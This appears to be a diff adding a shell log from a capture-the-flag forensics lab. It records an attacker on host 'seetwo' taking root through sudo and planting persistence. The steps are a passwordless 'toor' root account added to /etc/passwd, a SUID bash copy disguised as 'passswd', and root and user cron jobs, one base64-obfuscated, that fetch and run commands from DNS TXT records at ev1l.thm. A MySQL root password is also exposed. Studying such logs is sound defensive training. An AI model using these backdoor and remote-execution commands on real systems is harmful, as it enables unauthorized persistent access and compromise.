@@ -1,0 +1,43 @@
+id
+uid=1000(bella) gid=1000(bella) groups=1000(bella),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev)
+
+cat /home/bella/.bash_history
+mysql -u root -p'vb0xIkSGbcEKBEi'
+
+sudo -l
+Matching Defaults entries for bella on seetwo:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User bella may run the following commands on seetwo:
+    (ALL : ALL) ALL
+
+uid=0(root) gid=0(root) groups=0(root)
+
+echo 'toor::0:0:root:/root:/bin/bash' >> /etc/passwd
+
+tail -n 1 /etc/passwd
+toor::0:0:root:/root:/bin/bash
+
+cp /usr/bin/bash /usr/bin/passswd
+
+chmod u+s /usr/bin/passswd
+
+ls -l /usr/bin/passswd
+-rwsr-xr-x 1 root root 1183448 Oct 27 03:07 /usr/bin/passswd
+
+md5sum /usr/bin/passswd
+23c415748ff840b296d0b93f98649dec  /usr/bin/passswd
+
+md5sum /usr/bin/bash
+23c415748ff840b296d0b93f98649dec  /usr/bin/bash
+
+echo '* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"' >> /var/spool/cron/crontabs/root
+
+tail -n 1 /var/spool/cron/crontabs/root
+* * * * * /bin/sh -c "sh -c $(dig ev1l.thm TXT +short @ns.ev1l.thm)"
+
+echo '* * * * * echo L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMuVEhNe1NlZTJzTmV2M3JHZXRPbGR9LnRobSki | base64 | sh' >> /var/spool/cron/crontabs/bella
+
+tail -n 1 /var/spool/cron/crontabs/bella
+* * * * * echo L2Jpbi9zaCAtYyAic2ggLWMgJChkaWcgZXYxbC50aG0gVFhUICtzaG9ydCBAbnMuVEhNe1NlZTJzTmV2M3JHZXRPbGR9LnRobSki | base64 | sh
+
